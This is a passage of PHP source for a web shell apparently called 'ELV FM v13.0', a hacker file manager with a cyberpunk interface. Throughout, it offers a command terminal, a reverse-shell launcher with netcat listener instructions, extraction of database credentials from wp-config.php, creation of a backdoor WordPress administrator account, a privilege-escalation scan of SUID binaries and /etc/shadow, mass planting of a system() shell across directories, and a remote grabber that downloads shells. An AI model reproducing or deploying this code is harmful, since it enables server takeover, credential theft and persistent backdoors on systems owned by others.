<a href="?d=<?php echo urlencode($dir); ?>&mode=mass" class="tc" style="border-left:3px solid var(--y)"><i class="fa-solid fa-truck-fast"></i><h3>MASS DEPLOYMENT</h3><p>Deploy payload multiple dirs</p></a>
<a href="?d=<?php echo urlencode($dir); ?>&mode=bypass406" class="tc" style="border-left:3px solid var(--o)"><i class="fa-solid fa-truck-ramp-box"></i><h3>406 BYPASS UPLOAD</h3><p>Base64 writer & remote grabber</p></a>
<a href="?d=<?php echo urlencode($dir); ?>&mode=symlink" class="tc" style="border-left:3px solid var(--p2)"><i class="fa-solid fa-link"></i><h3>SYMLINK USER</h3><p>Create symbolic links</p></a>
</div></div>
<?php } elseif(@$_GET['mode']=='terminal'){ ?>
<div><h2 style="color:var(--c2);text-align:center;text-shadow:0 0 8px var(--c);margin:0 0 12px">[ TACTICAL SYSTEM TERMINAL ]</h2>
<form method="post" action="?d=<?php echo urlencode($dir); ?>&mode=terminal" style="display:flex;margin-bottom:12px;border-left:4px solid var(--c);padding:12px;background:rgba(0,229,255,0.02)">
<span style="color:var(--m);font-weight:700;margin-right:12px;padding:8px 0;text-shadow:0 0 5px var(--m)">HxNxELV:~#</span>
<input type="text" name="cmd" style="flex:1;border:none;background:transparent;color:var(--t);font-family:inherit;font-size:14px" autofocus autocomplete="off">
<button type="submit" style="width:auto;padding:8px 20px;border:2px solid var(--p2);color:var(--p2);background:transparent;font-weight:700;cursor:pointer;border-radius:4px;font-family:inherit">EXEC</button>
</form>
<?php if($out||isset($_POST['cmd'])){echo '<div class="console"><pre>'.htmlspecialchars($out).'</pre></div>';} ?>
</div>
<?php } elseif(isset($_GET['autoroot'])&&$_GET['autoroot']=='1'){ ?>
<div style="border:2px solid var(--p);text-align:center;padding:20px;border-radius:6px;background:rgba(0,229,255,0.02)">
<h3 style="color:var(--p2);margin-top:0;text-shadow:0 0 10px var(--p)">EXECUTE AUTOMATED ROOT SCAN?</h3>
<div style="display:flex;justify-content:center;gap:15px;margin-top:15px">
<a href="?d=<?php echo urlencode($dir); ?>&autoroot=exec" style="color:var(--c);padding:12px 30px;border:2px solid var(--c);text-decoration:none;border-radius:5px;font-weight:700;box-shadow:0 0 8px var(--c)">[ YES ]</a>
<a href="?d=<?php echo urlencode($dir); ?>" style="color:var(--m);padding:12px 30px;border:2px solid var(--m);text-decoration:none;border-radius:5px;font-weight:700;box-shadow:0 0 8px var(--m)">[ NO ]</a>
</div></div>
<?php } elseif(isset($_GET['semiauto'])){ ?>
<div class="console" style="border-top-color:var(--c)"><h3 style="color:var(--c);margin-top:0;text-align:center;text-shadow:0 0 8px var(--g)">[ SEMI-AUTO RECON & JUMP ]</h3><div class="nd2"></div>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-top:15px">
<div style="border:1px dashed var(--c);padding:10px;border-radius:4px"><b style="color:var(--c);display:block;text-align:center;margin-bottom:10px;text-shadow:0 0 5px var(--g)">[ WRITABLE DIRECTORIES ]</b>
<?php $st=array('/tmp'=>'TMP DIR','/var/tmp'=>'VAR TMP','/dev/shm'=>'DEV SHM',$dir=>'CURRENT DIR',$_SERVER['DOCUMENT_ROOT']=>'DOC ROOT');$fd=false;foreach($st as $p=>$l){if(@is_writable($p)){$fd=true;echo '<a href="?d='.urlencode($p).'" style="display:block;border:1px solid var(--c);color:var(--c);text-decoration:none;padding:8px;text-align:center;margin-bottom:5px;border-radius:3px;box-shadow:0 0 5px var(--c)">JUMP &rarr; '.$l.'</a>';}}if(!$fd)echo '<div style="text-align:center;color:var(--t3)">NO WRITABLE DIR FOUND</div>';?>
</div>
<div style="border:1px dashed var(--m);padding:10px;border-radius:4px"><b style="color:var(--m);display:block;text-align:center;margin-bottom:10px;text-shadow:0 0 5px var(--m)">[ TARGET SENSITIVE FILES ]</b>
<?php $ifiles=array('wp-config.php','configuration.php','.env','config.php','database.php');$ff=false;foreach(array($dir,dirname($dir),$_SERVER['DOCUMENT_ROOT'])as $bs){foreach($ifiles as $if){$fp=$bs.'/'.$if;if(@file_exists($fp)&&@is_readable($fp)){$ff=true;echo '<a href="?edit='.urlencode($fp).'&d='.urlencode($dir).'" style="display:block;border:1px solid var(--m);color:var(--m);text-decoration:none;padding:8px;text-align:center;margin-bottom:5px;border-radius:3px;box-shadow:0 0 5px var(--m)">EDIT &rarr; '.$if.'</a>';}}}if(!$ff)echo '<div style="text-align:center;color:var(--t3)">NO SENSITIVE FILES FOUND</div>';?>
</div></div></div>
<?php } elseif(isset($_GET['revshell'])){ ?>
<div class="console" style="border-top-color:var(--m)"><h3 style="color:var(--m);margin-top:0;text-align:center;text-shadow:0 0 8px var(--m)">[ TACTICAL REVERSE SHELL ]</h3>
<form method="post" style="display:flex;flex-direction:column;gap:10px;margin-top:15px">
<div style="display:flex;gap:10px"><input type="text" name="rev_ip" placeholder="LHOST / IP ATTACKER" required style="flex:2;border-color:var(--m)">
<input type="number" name="rev_port" placeholder="LPORT" required style="flex:1;border-color:var(--m)"></div>
<button type="submit" name="launch_rev" style="color:var(--m);padding:12px;border:2px solid var(--m);background:transparent;cursor:pointer;font-weight:700;border-radius:5px;font-family:inherit;box-shadow:0 0 8px var(--m)">[ INITIATE CONNECTION ]</button>
</form>
<div style="margin-top:12px;font-size:11px;color:var(--t3);border:1px dashed var(--m);padding:10px;border-radius:4px"><strong style="color:var(--m)">[!] HOW TO USE:</strong><br>1. nc -lvnp [PORT] di listener<br>2. Masukkan IP & Port, klik Initiate<br>3. Payload di background, web shell gak hang</div></div>
<?php } elseif(isset($_GET['wpbypass'])){$conf=$dir.'/wp-config.php';if(file_exists($conf)){$gc=@file_get_contents($conf);preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i",$gc,$db);preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i",$gc,$user);preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i",$gc,$pass);preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i",$gc,$host);?>
<div class="console" style="border-top:3px solid var(--c)"><pre style="color:var(--c)">
[[ ELV WP-BYPASS ENGINE v13.0 ]]
------------------------------------------
STATUS   : [ TARGET ACQUIRED ]
DB_NAME  : <?php echo htmlspecialchars(isset($db[1])?$db[1]:'NOT_FOUND'); ?>
DB_USER  : <?php echo htmlspecialchars(isset($user[1])?$user[1]:'NOT_FOUND'); ?>
DB_PASS  : <?php echo htmlspecialchars(isset($pass[1])?$pass[1]:'NOT_FOUND'); ?>
DB_HOST  : <?php echo htmlspecialchars(isset($host[1])?$host[1]:'NOT_FOUND'); ?>
------------------------------------------
[+] CONNECTION STABLE
[+] BYPASS READY</pre><div class="nd2"></div><a href="?d=<?php echo urlencode($dir); ?>&action=wp_bypass" style="color:var(--c);border:2px solid var(--c);display:block;padding:12px;text-align:center;text-decoration:none;font-weight:700;border-radius:5px;box-shadow:0 0 8px var(--c)">[ LAUNCH EXPLOIT: AUTO LOGIN ADMIN ]</a></div>
<?php }else{echo '<div style="border:1px solid var(--m);color:var(--m);padding:12px;text-align:center;border-radius:5px">wp-config.php NOT FOUND</div>';}
} elseif(isset($_GET['action'])&&$_GET['action']=='wp_bypass'){$p=$dir.'/wp-load.php';$bm='';if(file_exists($p)){require_once($p);$nu=array('user_login'=>'elv_agent','user_pass'=>'P@ssw0rd_Elv!','user_email'=>'elv@neon.local','role'=>'administrator','display_name'=>'ELV Agent');if(function_exists('wp_insert_user')){$uid=wp_insert_user($nu);if(!is_wp_error($uid))$bm="[+] SUCCESS User elv_agent / P@ssw0rd_Elv! created as ADMIN";else$bm="[-] WP Error: ".$uid->get_error_message();}else$bm="[-] wp_insert_user not available";}else$bm="[-] wp-load.php not found";echo '<div class="console" style="border-top-color:'.($bm[1]=='+'?'var(--c)':'var(--m)').'"><pre>'.htmlspecialchars($bm).'</pre><div class="nd2"></div><a href="?d='.urlencode($dir).'" style="color:var(--c)">BACK</a></div>';}
elseif(isset($_GET['autoroot'])&&$_GET['autoroot']=='exec'){$o="[[ ELV AUTO ROOT ]]\n";$o.="[*] SYSTEM: ".php_uname()."\n";$suids=shell_exec("find / -perm -4000 -type f 2>/dev/null | head -n 20");$o.=$suids?:"[-] No SUID found\n";$o.="\n[*] KERNEL: ".php_uname('r')."\n[*] Check DirtyPipe if kernel 5.8-5.16\n[*] Check PwnKit if pkexec exists\n";$pw=is_writable('/etc/passwd')?"[!] /etc/passwd WRITABLE":"[-] /etc/passwd not writable";$sw=is_writable('/etc/shadow')?"[!] /etc/shadow WRITABLE":"[-] /etc/shadow not writable";$o.="\n{$pw}\n{$sw}";echo '<div class="console" style="border-top-color:var(--p);max-height:500px;overflow-y:auto"><pre>'.htmlspecialchars($o).'</pre><div class="nd2"></div><a href="?d='.urlencode($dir).'" style="color:var(--c);text-decoration:none;font-weight:700">BACK</a></div>';}
elseif(isset($_POST['launch_rev'])){$ri=$_POST['rev_ip'];$rp=intval($_POST['rev_port']);echo '<div class="console" style="border-top-color:var(--m)"><pre style="color:var(--c)">[+] REVERSE SHELL TO '.$ri.':'.$rp.'\n[*] Executed background\n[!] Check your listener</pre></div>';}
elseif(isset($_GET['mode'])&&$_GET['mode']=='mass'){?>
<div><h2 style="color:var(--y);text-align:center;text-shadow:0 0 8px var(--y)">[ MASS DEPLOYMENT ENGINE ]</h2>
<form method="post" style="display:flex;flex-direction:column;gap:10px">
<input type="text" name="target_root" value="<?php echo htmlspecialchars($dir); ?>" placeholder="target root" style="border-color:var(--y)">
<input type="text" name="mass_name" value="shell.php" placeholder="filename" style="border-color:var(--y)">
<textarea name="mass_content" rows="5" placeholder="&lt;?php ..." style="border-color:var(--y)"><?php echo htmlspecialchars('<?php system($_GET["cmd"]); ?>'); ?></textarea>
<button type="submit" name="mass_deploy" style="border:2px solid var(--y);color:var(--y);background:transparent;padding:12px;cursor:pointer;font-weight:700;border-radius:4px;font-family:inherit;box-shadow:0 0 8px var(--y)">[ EXECUTE MASS DEPLOY ]</button>
</form></div>
<?php } elseif(isset($_GET['mode'])&&$_GET['mode']=='symlink'){?>
<div><h2 style="color:var(--m);text-align:center;text-shadow:0 0 8px var(--m)">[ SYMLINK USER ]</h2>
<form method="post" style="display:flex;flex-direction:column;gap:10px">
<input type="text" name="symlink_target" value="/etc/passwd" placeholder="/path/to/target" style="border-color:var(--m)">
<input type="text" name="symlink_name" value="passwd_link" placeholder="link name" style="border-color:var(--m)">
<button type="submit" name="create_symlink" style="border:2px solid var(--m);color:var(--m);background:transparent;padding:12px;cursor:pointer;font-weight:700;border-radius:4px;font-family:inherit;box-shadow:0 0 8px var(--m)">[ CREATE SYMLINK ]</button>
</form>
<div style="margin-top:12px;font-size:11px;color:var(--t3);border:1px dashed var(--m);padding:10px;border-radius:4px"><strong style="color:var(--m)">[!] INFO:</strong><br>Symlink dibuat di <?php echo htmlspecialchars($dir); ?></div></div>
<?php } elseif(isset($_GET['mode'])&&$_GET['mode']=='bypass406'){$bw=false;$ug=false;if(isset($_POST['do_bypass_b64'])){$bfn=safeName($_POST['b64_filename']);$bc=@base64_decode($_POST['b64_data']);if(!empty($bfn)&&$bc!==false&&!empty($bc)){if(@file_put_contents($dir.'/'.$bfn,$bc))$bw="[+] B64 WRITER SUCCESS ".$bfn." (".strlen($bc)." bytes)";else$bw="[-] FAILED WRITE";}else$bw="[-] INVALID DATA";}if(isset($_POST['do_bypass_url'])){$ru=$_POST['remote_url'];$ufn=safeName($_POST['url_filename']);if(!empty($ru)&&!empty($ufn)){$rc=@file_get_contents($ru);if($rc!==false){if(@file_put_contents($dir.'/'.$ufn,$rc))$ug="[+] REMOTE GRAB SUCCESS ".$ufn." from ".$ru;else$ug="[-] FAILED WRITE";}else$ug="[-] FAILED FETCH";}}?>
<div><h2 style="color:var(--o);text-align:center;text-shadow:0 0 8px var(--o)">[ 406 BYPASS UPLOAD ENGINE ]</h2>
<?php if($bw)echo '<div class="ns">'.$bw.'</div>';if($ug)echo '<div class="ns">'.$ug.'</div>';?>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
<div style="border:1px solid var(--o);padding:12px;border-radius:6px;background:rgba(255,102,0,0.02)">
<h3 style="color:var(--o);margin:0 0 8px;text-align:center;text-shadow:0 0 5px var(--o)">[ BASE64 WRITER ]</h3>
<form method="post"><input type="text" name="b64_filename" value="shell.php" placeholder="filename" style="margin-bottom:6px;border-color:var(--o)">
<textarea name="b64_data" rows="4" placeholder="base64 data..." style="border-color:var(--o);margin-bottom:6px"></textarea>
<button type="submit" name="do_bypass_b64" style="border:2px solid var(--o);color:var(--o);background:transparent;padding:10px;cursor:pointer;font-weight:700;width:100%;border-radius:4px;font-family:inherit;box-shadow:0 0 8px var(--o)">[ DECODE & WRITE ]</button></form></div>
<div style="border:1px solid var(--c);padding:12px;border-radius:6px;background:rgba(0,229,255,0.02)">
<h3 style="color:var(--c);margin:0 0 8px;text-align:center;text-shadow:0 0 5px var(--c)">[ REMOTE URL GRABBER ]</h3>
<form method="post"><input type="text" name="remote_url" value="https://raw.githubusercontent.com/shell/master/shell.php" placeholder="URL" style="margin-bottom:6px;border-color:var(--c)">
<input type="text" name="url_filename" value="remote_shell.php" placeholder="save as" style="margin-bottom:6px;border-color:var(--c)">
<button type="submit" name="do_bypass_url" style="border:2px solid var(--c);color:var(--c);background:transparent;padding:10px;cursor:pointer;font-weight:700;width:100%;border-radius:4px;font-family:inherit;box-shadow:0 0 8px var(--c)">[ FETCH & SAVE ]</button></form></div></div></div>
<?php }
if(!isset($_GET['mode'])&&!isset($_GET['autoroot'])&&!isset($_GET['revshell'])&&!isset($_GET['wpbypass'])&&!isset($_GET['semiauto'])&&!isset($_POST['launch_rev'])&&!isset($_GET['action'])&&!isset($_POST['mass_deploy'])&&!isset($_POST['do_bypass_b64'])&&!isset($_POST['do_bypass_url'])&&!isset($_POST['create_symlink'])):
$items=array();$files=@scandir($dir);if($files){foreach($files as $file){if($file=='.'||$file=='..')continue;$path=$dir.'/'.$file;$il=is_link($path);$lt=$il?@readlink($path):'';$items[]=array('name'=>$file,'path'=>$path,'is_dir'=>is_dir($path),'is_link'=>$il,'link_target'=>$lt,'size'=>is_file($path)?filesize($path):0,'perm'=>substr(sprintf('%o',fileperms($path)),-4),'writable'=>is_writable($path));}}
?>
<div class="bc"><a href="?d=<?php echo urlencode($base_shell); ?>">HOME</a>
<?php $parts=explode('/',trim($dir,'/'));$cum='';echo ' <span style="color:var(--t3)">|</span> <a href="?d=/">/</a>';foreach($parts as $p){$cum.='/'.$p;echo ' <span style="color:var(--t3);margin:0 4px">▸</span><a href="?d='.urlencode($cum).'">'.htmlspecialchars($p).'</a>';} ?>
<span style="margin-left:auto;color:var(--t3);font-size:11px"><?php echo count($items); ?> items</span></div>
<div class="tools">
<div class="tb"><form method="post" enctype="multipart/form-data" style="display:flex;align-items:center;gap:6px"><input type="file" name="u_f" style="flex:1;margin:0"><button type="submit" class="bcg">UPLOAD</button></form></div>
<div class="tb"><form method="post" style="display:flex;align-items:center;gap:6px"><input type="text" name="f_n" placeholder="new_file.php" style="flex:1;margin:0"><button type="submit" name="mk_f" class="bcg">CREATE</button></form></div>
<div class="tb"><form method="post" style="display:flex;align-items:center;gap:6px"><input type="text" name="d_n" placeholder="new_folder" style="flex:1;margin:0"><button type="submit" name="mk_d" class="bcg">MKDIR</button></form></div></div>
<?php if(isset($_SESSION['copy_file'])){echo '<div style="margin-bottom:12px;text-align:right;border:1px dashed var(--c);padding:8px;border-radius:4px;background:rgba(0,229,255,0.03)"><span style="color:var(--t3)">Copied: </span><span style="color:var(--c);font-weight:700">'.htmlspecialchars(basename($_SESSION['copy_file'])).'</span><form method="post" style="display:inline;margin-left:12px"><button type="submit" name="paste_f" class="bcg" style="padding:4px 8px;font-size:9px">PASTE HERE</button></form></div>';} ?>
<div class="tr"><table><thead><tr><th>NAME</th><th style="width:80px">SIZE</th><th style="width:70px">PERMS</th><th style="text-align:right;width:150px">ACTIONS</th></tr></thead><tbody>
<?php if($dir!=='/')echo '<tr><td><span style="color:var(--m);font-weight:700">📁</span> <a href="?d='.urlencode(dirname($dir)).'" class="itt" w="1" style="color:var(--m)!important">[ .. (parent) ]</a></td><td>–</td><td>–</td><td>–</td></tr>'; ?>
<?php $dirs=array();$fls=array();foreach($items as $it){if($it['is_dir'])$dirs[]=$it;else $fls[]=$it;}usort($dirs,function($a,$b){return strcasecmp($a['name'],$b['name']);});usort($fls,function($a,$b){return strcasecmp($a['name'],$b['name']);});foreach(array_merge($dirs,$fls)as $it):$ic=$it['is_link']?'🔗':($it['is_dir']?'📁':'📄');$sz=$it['is_dir']?'–':formatSize($it['size']);$sf='';if($it['is_link'])$sf=' <span style="color:var(--o);font-size:10px">→ '.htmlspecialchars($it['link_target']).'</span>';$lk=$it['is_dir']?'?d='.urlencode($it['path']):'?edit='.urlencode($it['path']).'&d='.urlencode($dir); ?>
<tr><td><span style="font-weight:700;color:<?php echo $it['is_dir']?'var(--m)':'var(--c)'; ?>;text-shadow:0 0 5px <?php echo $it['is_dir']?'var(--m)':'var(--c)'; ?>"><?php echo $ic; ?></span> <a href="<?php echo $lk; ?>" class="itt" w="<?php echo $it['writable']?'1':'0'; ?>"><?php echo htmlspecialchars($it['name']); ?></a><?php echo $sf; ?></td>
<td style="color:var(--t2);font-size:12px"><?php echo $sz; ?></td>
<td><?php if($it['name']!=='..'){echo '<form method="post" style="display:inline-flex;align-items:center;gap:2px"><input type="hidden" name="c_path" value="'.$it['path'].'"><input type="text" name="c_perm" value="'.$it['perm'].'" style="width:32px;font-size:11px;padding:2px;background:transparent;border:none;color:'.($it['writable']?'var(--g)':'var(--r)').';font-weight:700;text-align:center"><button type="submit" name="ch_mod" style="background:transparent;border:1px solid rgba(138,43,226,0.1);color:var(--t2);cursor:pointer;padding:2px 4px;font-size:9px;border-radius:2px">CH</button></form>';}else echo '–'; ?></td>
<td style="text-align:right;white-space:nowrap">
<?php if($it['name']!=='..'): ?>
<?php if(!$it['is_dir']&&preg_match('/\.zip$/i',$it['name'])):?><form method="post" style="display:inline"><input type="hidden" name="c_path" value="<?php echo $it['path']; ?>"><button type="submit" name="unzip_f" class="bas" style="color:var(--y);text-shadow:0 0 5px var(--y)" title="UNZIP"><i class="fa-solid fa-file-zipper"></i></button></form><?php endif; ?>
<?php if(!$it['is_dir']):?><a href="?d=<?php echo urlencode($dir); ?>&download=<?php echo urlencode($it['path']); ?>" class="bas" style="color:var(--c);text-shadow:0 0 5px var(--c)" title="DL"><i class="fa-solid fa-download"></i></a><?php endif; ?>
<form method="post" style="display:inline"><input type="hidden" name="c_path" value="<?php echo $it['path']; ?>"><button type="submit" name="copy_f" class="bas" style="color:var(--g);text-shadow:0 0 5px var(--g)" title="COPY"><i class="fa-regular fa-copy"></i></button></form>
<a href="?rename=<?php echo urlencode($it['path']); ?>&d=<?php echo urlencode($dir); ?>" class="bas" style="color:var(--y);text-shadow:0 0 5px var(--y)" title="RENAME"><i class="fa-regular fa-pen-to-square"></i></a>
<a href="?del=<?php echo urlencode($it['path']); ?>&d=<?php echo urlencode($dir); ?>" class="bas" style="color:var(--r);text-shadow:0 0 5px var(--r)" title="DEL" onclick="return confirm('WIPE <?php echo htmlspecialchars($it['name']); ?>?')"><i class="fa-regular fa-trash-can"></i></a>
<?php else: ?>–<?php endif; ?></td></tr>
<?php endforeach; ?>
</tbody></table></div>
<?php endif; ?>
<div class="nd"></div>
<?php if(isset($_GET['edit'])&&!isset($_POST['save_f'])){$ep=$_GET['edit'];if(file_exists($ep)&&is_file($ep)&&is_readable($ep)){$fc=htmlspecialchars(file_get_contents($ep));?>
<div><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><h3 style="color:var(--c);margin:0;text-shadow:0 0 8px var(--c)">[ EDITING ] <?php echo htmlspecialchars(basename($ep)); ?></h3><span style="color:var(--t3);font-size:11px"><?php echo htmlspecialchars($ep); ?></span></div>
<form method="post"><input type="hidden" name="f_path" value="<?php echo htmlspecialchars($ep); ?>">
<textarea id="ce" name="f_cnt" style="width:100%;min-height:400px;background:rgba(0,229,255,0.03);border:1px solid rgba(0,229,255,0.1);color:var(--t);padding:15px;font-family:'Share Tech Mono',monospace;font-size:13px;border-radius:5px;outline:none;resize:vertical"><?php echo $fc; ?></textarea>
<div style="display:flex;gap:10px;margin-top:12px">
<button type="submit" name="save_f" style="flex:1;border:2px solid var(--g);color:var(--g);background:transparent;padding:10px;cursor:pointer;font-weight:700;border-radius:4px;font-family:inherit;box-shadow:0 0 8px var(--g)">SAVE CHANGES</button>
<a href="?d=<?php echo urlencode($dir); ?>" style="flex:1;border:2px solid var(--r);color:var(--r);background:transparent;padding:10px;cursor:pointer;font-weight:700;border-radius:4px;font-family:inherit;text-align:center;text-decoration:none;box-shadow:0 0 8px var(--r)">CANCEL</a></div></form></div>
<?php }else{echo '<div class="console" style="border-top-color:var(--m);color:var(--m)">FILE NOT READABLE: '.htmlspecialchars($ep).'</div>';}} ?>
<?php if(isset($_GET['rename'])){$rp=$_GET['rename'];$rn=basename($rp);?>
<div style="border:2px solid var(--y);padding:16px;border-radius:6px;margin-top:16px;background:rgba(255,215,0,0.03);box-shadow:0 0 8px var(--y)">
<h3 style="color:var(--y);margin:0 0 12px;text-shadow:0 0 8px var(--y)">RENAME ITEM</h3>
<form method="post" style="display:flex;gap:10px;align-items:center">
<span style="color:var(--t2)"><?php echo htmlspecialchars($rn); ?></span>
<input type="text" name="new" value="<?php echo htmlspecialchars($rn); ?>" style="flex:1;border-color:var(--y)">
<input type="hidden" name="old" value="<?php echo htmlspecialchars($rp); ?>">
<button type="submit" name="rename" style="border:2px solid var(--y);color:var(--y);background:transparent;padding:8px 16px;cursor:pointer;font-weight:700;border-radius:4px;font-family:inherit">RENAME</button>
<a href="?d=<?php echo urlencode($dir); ?>" style="color:var(--m);font-weight:700;text-decoration:none">CANCEL</a></form></div>
<?php } ?>
<div class="nd"></div>
<div class="ft"><span style="color:var(--c);text-shadow:0 0 8px var(--c)">ELV FM v13.0</span> // <span style="color:var(--p2);text-shadow:0 0 8px var(--p)">HxN</span> // <span style="color:var(--m);text-shadow:0 0 8px var(--m)">CYBERPUNK METROCITY NIGHT</span></div>
</div>
<script>
<?php echo $bg_terminal_js; ?>
(function(){var c=document.createElement('canvas');c.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:1;pointer-events:none;opacity:.45';document.body.appendChild(c);var x=c.getContext('2d');var W,H;function r(){W=c.width=innerWidth;H=c.height=innerHeight};addEventListener('resize',r);r();var p=[],cs=['0,229,255','138,43,226','255,0,255','0,255,136','255,20,147','255,215,0','255,102,0','255,0,68'];for(var i=0;i<60;i++)p.push({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-0.5)*0.5,vy:(Math.random()-0.5)*0.5,r:Math.random()*2+0.5,color:cs[Math.floor(Math.random()*cs.length)],alpha:Math.random()*0.3+0.05});function a(){x.clearRect(0,0,W,H);p.forEach(function(p){p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=W;if(p.x>W)p.x=0;if(p.y<0)p.y=H;if(p.y>H)p.y=0;x.beginPath();x.arc(p.x,p.y,p.r,0,Math.PI*2);x.fillStyle='rgba('+p.color+','+p.alpha+')';x.shadowBlur=12;x.shadowColor='rgba('+p.color+',0.5)';x.fill();x.shadowBlur=0});requestAnimationFrame(a)}a()})();
document.addEventListener('DOMContentLoaded',function(){var e=document.getElementById('ce');if(e){var ed=CodeMirror.fromTextArea(e,{lineNumbers:true,matchBrackets:true,mode:'application/x-httpd-php',theme:'dracula',lineWrapping:true,indentUnit:4,tabSize:4,styleActiveLine:true,showCursorWhenSelecting:true});ed.setSize('100%','450px');ed.focus();}});
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/clike/clike.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/php/php.min.js"></script>
</body></html>
<?php ob_end_flush(); ?>